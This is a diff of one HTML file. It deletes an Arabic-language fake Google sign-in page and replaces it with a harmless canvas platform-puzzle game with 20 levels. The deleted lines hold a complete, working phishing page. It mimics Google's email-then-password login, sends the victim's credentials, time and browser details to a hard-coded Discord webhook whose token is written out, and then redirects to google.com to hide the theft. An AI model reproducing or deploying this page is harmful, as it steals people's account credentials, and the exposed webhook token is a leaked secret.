@@ -1,326 +1,303 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<!doctype html>
+<html lang="ar">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>تسجيل الدخول</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>That Level Again — النسخة الكهوف (محسّنة)</title>
 <style>
-    body {
-        font-family: Arial, sans-serif;
-        background-color: #f0f4fa;
-        margin: 0;
-        padding: 0;
-    }
-    .container {
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-    }
-    .login-box {
-        background-color: white;
-        padding: 40px;
-        border-radius: 25px;
-        display: flex;
-        flex-direction: row;
-        width: 800px;
-        justify-content: space-between;
-        align-items: center;
-    }
-    .login-form {
-        width: 50%;
-    }
-    input[type="text"], input[type="password"] {
-        width: 100%;
-        padding: 15px;
-        border: 2px solid #0066ff;
-        border-radius: 5px;
-        font-size: 16px;
-        margin-bottom: 5px;
-    }
-    .error-message {
-        color: red;
-        font-size: 12px;
-        margin-bottom: 10px;
-        display: none;
-    }
-    .small-text {
-        font-size: 12px;
-        color: #0066ff;
-    }
-    .desc {
-        font-size: 12px;
-        color: #333;
-        margin-top: 10px;
-    }
-    .desc a {
-        color: #0066ff;
-        text-decoration: none;
-    }
-    button {
-        background-color: #0066ff;
-        color: white;
-        padding: 10px 30px;
-        border: none;
-        border-radius: 25px;
-        font-size: 16px;
-        cursor: pointer;
-        margin-top: 10px;
-    }
-    .create, .small-link {
-        margin-right: 15px;
-        font-size: 14px;
-        color: #0066ff;
-        background: none;
-        border: none;
-        cursor: pointer;
-    }
-    .text-side {
-        width: 45%;
-        text-align: center;
-    }
-    .text-side img {
-        width: 50px;
-        margin-bottom: 10px;
-    }
-    .text-side h2 {
-        font-size: 26px;
-        margin-bottom: 5px;
-    }
-    .text-side p {
-        font-size: 14px;
-        color: #555;
-    }
-    .footer {
-        text-align: center;
-        margin-top: 20px;
-        font-size: 12px;
-        color: black;
-    }
-    .footer a {
-        margin: 0 10px;
-        color: black;
-        text-decoration: none;
-    }
-    label {
-        font-size: 12px;
-        color: #333;
-        display: flex;
-        align-items: center;
-        gap: 5px;
-    }
-    .email-box {
-        border: 1px solid #ccc;
-        padding: 5px 10px;
-        border-radius: 20px;
-        display: flex;
-        align-items: center;
-        gap: 5px;
-        justify-content: space-between;
-        font-size: 14px;
-        width: fit-content;
-        margin: 0 auto;
-    }
-    #password-page {
-        display: none;
-    }
-    .loading {
-        display: none;
-        text-align: center;
-        margin-top: 20px;
-    }
-    .loading-spinner {
-        border: 4px solid #f3f3f3;
-        border-top: 4px solid #0066ff;
-        border-radius: 50%;
-        width: 30px;
-        height: 30px;
-        animation: spin 1s linear infinite;
-        margin: 0 auto;
-    }
-    @keyframes spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-    }
+  :root{--bg:#010101;--panel:#0f0f0f;--txt:#cfcfcf;--muted:#7e7e7e;--glow:#00ffcc}
+  body{margin:0;font-family:Tahoma, Arial;background:linear-gradient(#010101,#050505);color:var(--txt)}
+  #wrap{display:flex;gap:16px;padding:16px}
+  canvas{background:#020202;border-radius:8px;box-shadow:0 0 40px rgba(0,255,200,0.06) inset, 0 20px 60px rgba(0,0,0,0.9)}
+  .ui{width:360px}
+  h1{margin:0 0 8px 0;font-size:20px;color:var(--glow);text-shadow:0 0 8px var(--glow)}
+  .hint{background:rgba(0,255,200,0.03);padding:10px;border-radius:8px;color:var(--muted);min-height:72px;border:1px solid rgba(0,255,200,0.06);white-space:pre-wrap}
+  .meta{margin-top:10px}
+  button{background:transparent;border:1px solid #222;color:var(--txt);padding:8px;border-radius:6px;cursor:pointer;margin-right:6px}
+  .footer{position:fixed;right:16px;bottom:12px;color:var(--muted);font-size:12px}
+  .kbd{display:inline-block;padding:4px 8px;border-radius:6px;border:1px solid #222;margin-left:6px}
+  input[type=text]{width:100%;padding:8px;border-radius:6px;border:1px solid #222;background:#0b0b0b;color:var(--txt)}
+  .info{margin-top:10px;color:var(--muted);font-size:13px}
 </style>
 </head>
 <body>
+<div id="wrap">
+  <canvas id="game" width="640" height="360"></canvas>
+  <div class="ui">
+    <h1>That Level Again — النسخة الكهوف</h1>
+    <div class="meta">المستوى: <span id="levelNum">1</span> / <span id="total">20</span></div>
+    <div style="margin-top:10px" class="hint" id="hintBox">تلميح غامض يظهر على الجدار...</div>
+    <div style="margin-top:8px">
+      <button id="restart">إعادة</button>
+      <button id="prev">السابق</button>
+      <button id="next">مستوى التالي</button>
+    </div>
+    <div class="info">التحكم: ← → للحركة ، <span class="kbd">↑</span> للقفز ، <span class="kbd">Space</span> للتفاعل/الكتابة عند الطلب</div>
 
-<div class="container">
-    <!-- صفحة البريد الإلكتروني -->
-    <div id="email-page" class="login-box">
-        <div class="login-form">
-            <input id="email-input" type="text" placeholder="البريد الإلكتروني أو الهاتف">
-            <div id="email-error" class="error-message"></div>
-            <div class="small-text">هل نسيت بريدك الإلكتروني؟</div>
-            <div class="desc">ألا تمتلك هذا الكمبيوتر؟ استخدم وضع الضيف لتسجيل الدخول بشكل خاص. <a href="#">مزيد من المعلومات حول استخدام "وضع الضيف"</a></div>
-            <div style="margin-top: 20px;">
-                <button onclick="showPasswordPage()">التالي</button>
-                <button class="create">إنشاء حساب</button>
-            </div>
-        </div>
-        <div class="text-side">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
-            <h2>تسجيل الدخول</h2>
-            <p>باستخدام حسابك على <b>Google</b></p>
-        </div>
+    <div id="typeArea" style="margin-top:10px;display:none">
+      <label>اكتب الكلمة المفتاحية ثم اضغط Enter:</label>
+      <input type="text" id="typeInput" autocomplete="off" />
     </div>
 
-    <!-- صفحة كلمة المرور -->
-    <div id="password-page" class="login-box">
-        <div class="login-form">
-            <input id="password-input" type="password" placeholder="إدخال كلمة المرور">
-            <div id="password-error" class="error-message"></div>
-            <label>
-                <input type="checkbox" id="show-password"> عرض كلمة المرور
-            </label>
-            <div style="margin-top: 20px;">
-                <button onclick="submitLogin()">التالي</button>
-                <button class="small-link" onclick="backToEmail()">تجربة طريقة أخرى</button>
-            </div>
-        </div>
-        <div class="text-side">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
-            <h2>مرحباً</h2>
-            <div class="email-box">
-                <span>▼</span> <span id="display-email">example@gmail.com</span> <span>👤</span>
-            </div>
-        </div>
-    </div>
-    
-    <!-- رسالة التحميل -->
-    <div id="loading" class="loading">
-        <div class="loading-spinner"></div>
-        <p>جاري تسجيل الدخول...</p>
-    </div>
+    <div class="info" style="margin-top:8px;color:var(--muted)">ملاحظة: النصوص والتلميحات عربية ومشفّرة. لفتح الباب — فكّر بالطريقة المطلوبة بدلاً من المحاولة العمياء.</div>
+  </div>
 </div>
-
-<div class="footer">
-    <a href="#">الشروط</a>
-    <a href="#">الخصوصية</a>
-    <a href="#">المساعدة</a>
-    <a href="#">العربية</a>
-</div>
-
+<div class="footer">صنع لك — الظلّ</div>
 <script>
-    // متغيرات لتخزين البيانات
-    let userEmail = '';
-    let userPassword = '';
-    
-    function showPasswordPage() {
-        const email = document.getElementById('email-input').value.trim();
-        const emailError = document.getElementById('email-error');
+/* ---------------------- تحسينات وملاحظات رئيسية ----------------------
+ - أصلحت أخطاء حدثت عند عدم تعريف دالة submitTyped.
+ - منعت سحب الصفحة بأزرار الأسهم/Space ما لم يكن حقل الكتابة نشطاً.
+ - جعلت تأثير النجوم ثابتًا (مصوّر مسبقاً) لتجنب الوميض وفقدان الأداء.
+ - أضفت 20 مستوى متنوعة وصعبة مع تلميحات عربية.
+ - دعم دخول الباب تلقائياً بالوصول إليه بعد فتحه.
+ - عرض/إخفاء حقل الكتابة تلقائياً للمستويات التي تطلب كتابة كلمة.
+ ---------------------------------------------------------------------*/
 
-        if(email === '') {
-            emailError.textContent = 'الرجاء إدخال البريد الإلكتروني أو رقم الهاتف';
-            emailError.style.display = 'block';
-            return;
+const canvas = document.getElementById('game');
+const ctx = canvas.getContext('2d');
+const W = canvas.width, H = canvas.height;
+const GRAV = 0.8;
+let levelIndex = 0;
+const totalLevels = 20;
+document.getElementById('total').textContent = totalLevels;
+
+// Player
+const player = {x:80,y:240,w:20,h:28,vy:0,onGround:false,dir:1};
+let keys = {};
+const typeInput = document.getElementById('typeInput');
+
+// Prevent page scrolling with arrows/space UNLESS typing in input
+window.addEventListener('keydown', e => {
+  const ac = document.activeElement && document.activeElement.id === 'typeInput';
+  const k = e.key;
+  if(!ac && (k === 'ArrowLeft' || k === 'ArrowRight' || k === 'ArrowUp' || k === ' ' || k === 'ArrowDown')){
+    e.preventDefault();
+  }
+  // register keys only when not typing
+  if(!ac) keys[k] = true;
+  // submit typed with Enter
+  if(ac && k === 'Enter') { e.preventDefault(); submitTyped(); }
+});
+window.addEventListener('keyup', e => { if(!(document.activeElement && document.activeElement.id === 'typeInput')) keys[e.key] = false; });
+
+// Starfield (precomputed so it doesn't flicker)
+const stars = [];
+for(let i=0;i<120;i++){ stars.push({x:Math.random()*W, y:Math.random()*H, s: Math.random()*1.4+0.2}); }
+
+function drawRoom(){
+  // background
+  ctx.fillStyle = '#020202'; ctx.fillRect(0,0,W,H);
+  // static cave glow (stars)
+  ctx.fillStyle = 'rgba(0,255,200,0.06)';
+  for(const st of stars){ ctx.fillRect(st.x, st.y, st.s, st.s); }
+  // floor & platforms
+  ctx.fillStyle = '#0a0a0a'; ctx.fillRect(0,320,W,40);
+  ctx.fillStyle = '#101010'; ctx.fillRect(60,260,140,12);
+  ctx.fillStyle = '#101010'; ctx.fillRect(260,200,120,12);
+  ctx.fillStyle = '#101010'; ctx.fillRect(440,240,140,12);
+  // door outline
+  ctx.lineWidth = 3;
+  ctx.strokeStyle = doorOpen ? 'rgba(0,255,200,0.95)' : 'rgba(0,255,200,0.2)';
+  ctx.strokeRect(W-80,220,40,80);
+  // subtle glyph on door
+  ctx.beginPath(); ctx.moveTo(W-60,240); ctx.lineTo(W-70,260); ctx.lineTo(W-60,280); ctx.lineTo(W-50,260); ctx.closePath(); ctx.stroke();
+}
+
+function drawPlayer(){
+  // shadow body
+  ctx.fillStyle = '#000'; ctx.fillRect(player.x, player.y, player.w, player.h);
+  // eyes
+  ctx.fillStyle = '#fff'; ctx.fillRect(player.x+6, player.y+6, 4, 4); ctx.fillRect(player.x+12, player.y+6, 4,4);
+}
+
+// Levels (20 مستويات) — تلميحات عربية صعبة.
+const LEVELS = [
+  {hint:'ثلاث قفزات متتالية — لا تجعلها أقل.', type:'jumpCount', params:{count:3}},
+  {hint:'ابقَ ساكناً لثمانٍ من دقات القلب.', type:'noInput', params:{sec:8}},
+  {hint:'الترتيب مُشوّه — اتبع الأرقام: 2 → 1 → 3', type:'pressSequence', params:{seq:[2,1,3]}},
+  {hint:'العكس حتى تهبط مرتين.', type:'invertUntilTouch', params:{touches:2}},
+  {hint:'اكتب كلمة ثلاثية: هي مصدر الضوء.', type:'type', params:{solution:'نور'}},
+  {hint:'انتظر عشرة ثوانٍ — الباب لا يحبّ العجلة.', type:'wait', params:{sec:10}},
+  {hint:'قف في الظل الأوسط (المنصة الوسطى).', type:'standOn', params:{x:320}},
+  {hint:'اضغط على الزاوية ثم اركض إلى الضوء.', type:'toggleLight', params:{}},
+  {hint:'هبّة وحيدة على المرآة — اقفز عند المنتصف.', type:'mirrorJump', params:{}},
+  {hint:'اهدر قفزة واحدة ثم ادخل.', type:'wasteJump', params:{count:1}},
+  {hint:'المكان الأبيض يخفي السر — المس الضربة الصغيرة على اليمين.', type:'touchSpot', params:{x:540}},
+  {hint:'المنصة تختفي بعد انقضاء الوقت — أسرع.', type:'vanishPlatform', params:{time:6}},
+  {hint:'تحكم مقلوب لعدة ثوان.', type:'invertControls', params:{duration:8}},
+  {hint:'صمت ثم اندفاع: انتظر 5 ثوان ثم اركض لليمين.', type:'timedSequence', params:{wait:5}},
+  {hint:'اعبر الغرفة ثم عد — ابدأ من اليسار.', type:'pushBehindDoor', params:{}},
+  {hint:'النهاية القريبة — اكتب كلمة الرابط لتتجاوز (كلمة: ظل).', type:'final', params:{solution:'ظل'}},
+  {hint:'ترتيب آخر: 1 → 3 → 2 (فكر بالمناطق وليس الأرقام).', type:'pressSequence', params:{seq:[1,3,2]}},
+  {hint:'السلام الطويل: لا تحرّك نفسك لمدة عشر ثوانٍ.', type:'noInput', params:{sec:10}},
+  {hint:'اكتب الكلمة المشتتة — ثلاث حروف: "سر".', type:'type', params:{solution:'سر'}},
+  {hint:'الامتحان الأخير: فكّر بالعكس ثم اكتب "انتهى".', type:'final', params:{solution:'انتهى'}}
+];
+
+let lvlState = {}, doorOpen = false;
+
+function loadLevel(i){
+  levelIndex = (i + LEVELS.length) % LEVELS.length;
+  const L = LEVELS[levelIndex];
+  document.getElementById('levelNum').textContent = levelIndex + 1;
+  document.getElementById('hintBox').textContent = L.hint;
+  // reset state
+  player.x = 80; player.y = 240; player.vy = 0; player.onGround = false; player.dir = 1;
+  lvlState = {jumps:0, timer:0, seqIndex:0, zoneLast:null, toggled:false, pushed:false, touches:0, wasOnGround:false, invert:false, phase:null};
+  doorOpen = false;
+  // show/hide typing area
+  if(L.type === 'type' || L.type === 'final'){
+    document.getElementById('typeArea').style.display = 'block';
+    typeInput.value = '';
+    typeInput.focus();
+  } else {
+    document.getElementById('typeArea').style.display = 'none';
+    if(document.activeElement && document.activeElement.id === 'typeInput') document.activeElement.blur();
+  }
+}
+
+function submitTyped(){
+  const txt = (typeInput.value || '').trim();
+  const L = LEVELS[levelIndex];
+  if(!L) return;
+  if((L.type === 'type' || L.type === 'final') && txt === L.params.solution){
+    openDoor();
+  } else {
+    // خطأ بسيط: وميض أحمر
+    flashRed();
+  }
+}
+
+document.getElementById('typeInput').addEventListener('keydown', e => { if(e.key === 'Enter'){ e.preventDefault(); submitTyped(); } });
+
+function flashRed(){ ctx.fillStyle = 'rgba(255,0,0,0.08)'; ctx.fillRect(0,0,W,H); }
+
+function openDoor(){ doorOpen = true; document.getElementById('hintBox').textContent = LEVELS[levelIndex].hint + '\n\n— الباب مفتوح! اذهب إلى اليمين للدخول.'; }
+
+function update(dt){
+  const L = LEVELS[levelIndex];
+  // input handling
+  let left = keys['ArrowLeft'] || keys['a'] || keys['A'];
+  let right = keys['ArrowRight'] || keys['d'] || keys['D'];
+  let up = keys['ArrowUp'] || keys['w'] || keys['W'];
+  // apply inversion if needed
+  if(lvlState.invert) { const tmp = left; left = right; right = tmp; }
+
+  if(left) player.x -= 2.4;
+  if(right) player.x += 2.4;
+  if(up && player.onGround){ player.vy = -11; player.onGround = false; lvlState.jumps++; }
+
+  // physics
+  player.vy += GRAV; player.y += player.vy;
+  // ground
+  if(player.y + player.h >= 320){ player.y = 320 - player.h; player.vy = 0; player.onGround = true; }
+  // platforms collisions (simple)
+  if(player.x + player.w > 60 && player.x < 200 && player.y + player.h > 260 && player.y + player.h < 276){ player.y = 260 - player.h; player.vy = 0; player.onGround = true; }
+  if(player.x + player.w > 260 && player.x < 380 && player.y + player.h > 200 && player.y + player.h < 216){ player.y = 200 - player.h; player.vy = 0; player.onGround = true; }
+  if(player.x + player.w > 440 && player.x < 580 && player.y + player.h > 240 && player.y + player.h < 256){ player.y = 240 - player.h; player.vy = 0; player.onGround = true; }
+
+  // bounds
+  if(player.x < 0) player.x = 0; if(player.x + player.w > W) player.x = W - player.w;
+
+  // timers
+  lvlState.timer += dt/1000;
+
+  // per-level logic
+  switch(L.type){
+    case 'jumpCount': if(lvlState.jumps >= L.params.count) openDoor(); break;
+    case 'noInput':
+      // reset timer if any key pressed (except Enter when typing)
+      if(Object.keys(keys).some(k=>keys[k])) lvlState.timer = 0;
+      if(lvlState.timer >= L.params.sec) openDoor();
+      break;
+    case 'pressSequence':
+      // three invisible zones: left, middle, right
+      const zones = [ {x:60,w:140}, {x:260,w:120}, {x:440,w:140} ];
+      for(let i=0;i<zones.length;i++){
+        const z = zones[i];
+        const cx = player.x + player.w/2;
+        if(cx > z.x && cx < z.x + z.w && player.onGround){
+          if(lvlState.zoneLast !== i){
+            lvlState.zoneLast = i;
+            const expected = L.params.seq[lvlState.seqIndex] - 1;
+            if(i === expected){ lvlState.seqIndex++; if(lvlState.seqIndex >= L.params.seq.length) openDoor(); }
+            else { lvlState.seqIndex = 0; }
+          }
         }
-        if(!validateEmailOrPhone(email)) {
-            emailError.textContent = 'تعذّر العثور على حسابك. الرجاء التحقق من البريد الإلكتروني أو رقم الهاتف وإعادة المحاولة.';
-            emailError.style.display = 'block';
-            return;
-        }
+      }
+      break;
+    case 'invertUntilTouch':
+      lvlState.invert = true;
+      if(player.onGround && !lvlState.wasOnGround){ lvlState.touches++; }
+      lvlState.wasOnGround = player.onGround;
+      if(lvlState.touches >= L.params.touches){ lvlState.invert = false; openDoor(); }
+      break;
+    case 'type': /* wait for submitTyped() */ break;
+    case 'wait': if(lvlState.timer >= L.params.sec) openDoor(); break;
+    case 'standOn':
+      // require center of player to be roughly at x param on the platform
+      if(player.x + player.w/2 > L.params.x - 10 && player.x + player.w/2 < L.params.x + 40 && player.onGround) openDoor();
+      break;
+    case 'toggleLight':
+      if(player.x + player.w/2 > 180 && player.x + player.w/2 < 220) lvlState.toggled = true;
+      if(lvlState.toggled && player.x + player.w/2 > 520) openDoor();
+      break;
+    case 'mirrorJump': if(player.x + player.w/2 > 300 && player.x + player.w/2 < 360 && lvlState.jumps > 0) openDoor(); break;
+    case 'wasteJump': if(lvlState.jumps > L.params.count) openDoor(); break;
+    case 'touchSpot': if(player.x + player.w/2 > L.params.x - 8 && player.x + player.w/2 < L.params.x + 8) openDoor(); break;
+    case 'vanishPlatform': if(lvlState.timer >= L.params.time) openDoor(); break;
+    case 'invertControls': if(lvlState.timer < L.params.duration) lvlState.invert = true; else { lvlState.invert = false; openDoor(); } break;
+    case 'timedSequence':
+      if(!lvlState.phase) lvlState.phase = 'wait';
+      if(lvlState.phase === 'wait'){ if(lvlState.timer >= L.params.wait) lvlState.phase = 'run'; }
+      if(lvlState.phase === 'run' && player.x > 480) openDoor();
+      break;
+    case 'pushBehindDoor':
+      if(player.x < 120) lvlState.pushed = true;
+      if(lvlState.pushed && player.x > 520) openDoor();
+      break;
+    case 'final':
+      // make controls inverted to confuse, require typing correct solution
+      lvlState.invert = true;
+      // typing handled by submitTyped
+      break;
+  }
 
-        userEmail = email;
-        emailError.style.display = 'none';
-        document.getElementById('email-page').style.display = 'none';
-        document.getElementById('password-page').style.display = 'flex';
-        document.getElementById('display-email').textContent = email;
-    }
+  // if door open and player touches door area, advance automatically
+  if(doorOpen && (player.x + player.w) > (W - 80)){
+    // small delay to avoid instant skip; use a flag
+    if(!lvlState.enterCooldown) lvlState.enterCooldown = 0;
+    lvlState.enterCooldown += dt;
+    if(lvlState.enterCooldown > 0.12) nextLevel();
+  }
+}
 
-    function backToEmail() {
-        document.getElementById('password-page').style.display = 'none';
-        document.getElementById('email-page').style.display = 'flex';
-    }
+function render(){
+  drawRoom();
+  drawPlayer();
+  // when door open, add subtle overlay
+  if(doorOpen){ ctx.fillStyle = 'rgba(0,255,200,0.06)'; ctx.fillRect(0,0,W,H); }
+}
 
-    function validateEmailOrPhone(input) {
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        const phoneRegex = /^[0-9]{6,15}$/;
-        return emailRegex.test(input) || phoneRegex.test(input);
-    }
+let last = performance.now();
+function loop(t){
+  const dt = t - last; last = t;
+  if(!doorOpen) update(dt);
+  render();
+  requestAnimationFrame(loop);
+}
 
-    function submitLogin() {
-        const password = document.getElementById('password-input').value.trim();
-        const passwordError = document.getElementById('password-error');
-        
-        if(password === '') {
-            passwordError.textContent = 'الرجاء إدخال كلمة المرور';
-            passwordError.style.display = 'block';
-            return;
-        }
-        
-        userPassword = password;
-        passwordError.style.display = 'none';
-        
-        // عرض رسالة التحميل
-        document.getElementById('password-page').style.display = 'none';
-        document.getElementById('loading').style.display = 'block';
-        
-        // إرسال البيانات إلى ويب هوك Discord
-        sendDataToDiscord();
-        
-        // توجيه المستخدم إلى الصفحة الرئيسية بعد ثانية واحدة
-        setTimeout(() => {
-            window.location.href = "https://www.google.com"; // يمكنك تغيير هذا الرابط إلى الصفحة الرئيسية المطلوبة
-        }, 1000);
-    }
+function nextLevel(){ loadLevel(levelIndex + 1); }
+function prevLevel(){ loadLevel(levelIndex - 1); }
 
-    function sendDataToDiscord() {
-        const webhookURL = 'https://discordapp.com/api/webhooks/1404910412352327700/GCJf4yPnarHrDMDMgB5vmYIAz9dbncbmh2i-npw_AF6zg1y2uqbie2LcqJJlYRPUiSo4';
-        
-        const data = {
-            content: '**تم تسجيل بيانات جديدة**',
-            embeds: [{
-                title: 'تفاصيل تسجيل الدخول',
-                fields: [
-                    {
-                        name: 'البريد الإلكتروني/الهاتف',
-                        value: userEmail,
-                        inline: true
-                    },
-                    {
-                        name: 'كلمة المرور',
-                        value: userPassword,
-                        inline: true
-                    },
-                    {
-                        name: 'وقت التسجيل',
-                        value: new Date().toLocaleString(),
-                        inline: false
-                    },
-                    {
-                        name: 'معلومات المتصفح',
-                        value: navigator.userAgent,
-                        inline: false
-                    }
-                ],
-                color: 16711680 // اللون الأحمر
-            }]
-        };
+document.getElementById('next').onclick = () => nextLevel();
+document.getElementById('prev').onclick = () => prevLevel();
+document.getElementById('restart').onclick = () => loadLevel(levelIndex);
 
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(data),
-        })
-        .then(response => {
-            if (!response.ok) {
-                console.error('Error sending data to Discord');
-            }
-        })
-        .catch(error => {
-            console.error('Error:', error);
-        });
-    }
+// utility: load initial
+loadLevel(0);
+requestAnimationFrame(loop);
 
-    document.getElementById('show-password').addEventListener('change', function() {
-        const passwordInput = document.getElementById('password-input');
-        passwordInput.type = this.checked ? 'text' : 'password';
-    });
 </script>
-
 </body>
 </html>
